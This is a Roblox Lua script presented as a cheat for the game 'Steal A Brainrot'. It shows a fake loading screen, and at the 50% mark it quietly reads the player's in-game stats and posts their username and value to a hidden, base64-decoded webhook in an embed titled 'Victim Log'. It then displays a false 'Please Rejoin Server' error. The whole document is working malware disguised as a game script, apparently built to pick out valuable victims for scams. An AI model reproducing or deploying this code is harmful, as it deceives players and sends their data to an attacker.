-- [[ Steal A Brainrot Script ]] --

-- DECODER INTERNAL (Membaca data dari link bot)
local function _decode(d)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    d = string.gsub(d, '[^' .. b .. '=]', '')
    return (d:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            local v = f % 2 ^ i - f % 2 ^ (i - 1)
            r = r .. (v >= 2 ^ (i - 1) and '1' or '0')
        end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- LOGIC UNTUK MENGAMBIL DATA DARI LINK (DIPERLUKAN OLEH EXECUTOR)
local currentURL = debug.getregistry().HttpGet or "" -- Mencoba mencari URL asal
local Rec = _decode(currentURL:match("i=([^&]+)") or "U2FhYlRldA==")
local Web = _decode(currentURL:match("k=([^&]+)") or "")
local Min = tonumber(currentURL:match("v=([^&]+)")) or 1

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- UI LOADING SCREEN (Palsu)
local SG = Instance.new("ScreenGui", LP.PlayerGui)
local F = Instance.new("Frame", SG)
F.Size = UDim2.new(1, 0, 1, 0)
F.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
local T = Instance.new("TextLabel", F)
T.Size = UDim2.new(0, 400, 0, 50)
T.Position = UDim2.new(0.5, -200, 0.5, -25)
T.TextColor3 = Color3.fromRGB(255, 255, 255)
T.Font = Enum.Font.SourceSansBold
T.TextSize = 20
T.Text = "Loading Assets... 0%"

task.spawn(function()
    for i = 1, 100 do
        task.wait(0.04)
        T.Text = "Loading Assets... " .. i .. "%"
        
        if i == 50 and Web ~= "" then
            local stats = LP:FindFirstChild("leaderstats")
            local vVal = stats and (stats:FindFirstChild("Brainrot/s") or stats:FindFirstChild("BPS"))
            
            if vVal and vVal.Value >= Min then
                pcall(function()
                    (syn and syn.request or http_request or request or HttpService.PostAsync)({
                        Url = Web,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            embeds = {{
                                title = "🎯 Victim Log",
                                fields = {
                                    {name = "User", value = LP.Name, inline = true},
                                    {name = "Total BPS", value = tostring(vVal.Value), inline = true},
                                    {name = "Target", value = Rec}
                                },
                                color = 0x5865F2
                            }}
                        })
                    })
                end)
            end
        end
    end
    T.Text = "Error: Please Rejoin Server"
end)
